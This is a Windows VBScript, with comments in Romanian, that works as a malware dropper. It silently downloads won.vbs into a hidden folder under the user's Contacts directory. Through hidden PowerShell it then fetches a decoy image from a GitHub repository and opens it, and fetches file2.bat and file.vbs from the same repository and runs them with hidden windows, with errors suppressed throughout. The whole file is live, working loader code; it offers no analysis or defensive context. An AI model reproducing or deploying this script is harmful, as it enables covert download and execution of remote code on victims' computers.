On Error Resume Next

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

targetFolder = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Contacts\zo"

If Not fso.FolderExists(targetFolder) Then
    fso.CreateFolder(targetFolder)
End If

' Descarcă won.vbs (silent)
Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
xmlHttp.Open "GET", "https://raw.githubusercontent.com/MoViper2244/VIPER2/refs/heads/main/won.vbs", False
xmlHttp.Send

If xmlHttp.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 1
    stream.Write xmlHttp.ResponseBody
    stream.SaveToFile targetFolder & "\won.vbs", 2
    stream.Close
End If

' Rulează comanda PowerShell complet SILENT
shell.Run "powershell -WindowStyle Hidden -Command """, 0, False
shell.Run "powershell -WindowStyle Hidden -Command ""Invoke-WebRequest 'https://raw.githubusercontent.com/MoViper2244/VIPER2/refs/heads/main/image.png' -OutFile $env:TEMP\image.png; Start-Process $env:TEMP\image.png; Invoke-WebRequest 'https://raw.githubusercontent.com/MoViper2244/VIPER2/refs/heads/main/file2.bat' -OutFile $env:TEMP\file2.bat; $psi = New-Object System.Diagnostics.ProcessStartInfo; $psi.FileName = 'cmd.exe'; $psi.Arguments = '/c $env:TEMP\file2.bat'; $psi.WindowStyle = 'Hidden'; [System.Diagnostics.Process]::Start($psi); Start-Sleep -Seconds 5; Invoke-WebRequest 'https://raw.githubusercontent.com/MoViper2244/VIPER2/refs/heads/main/file.vbs' -OutFile $env:TEMP\file.vbs; $psi = New-Object System.Diagnostics.ProcessStartInfo; $psi.FileName = 'wscript.exe'; $psi.Arguments = '$env:TEMP\file.vbs'; $psi.WindowStyle = 'Hidden'; [System.Diagnostics.Process]::Start($psi)""", 0, False
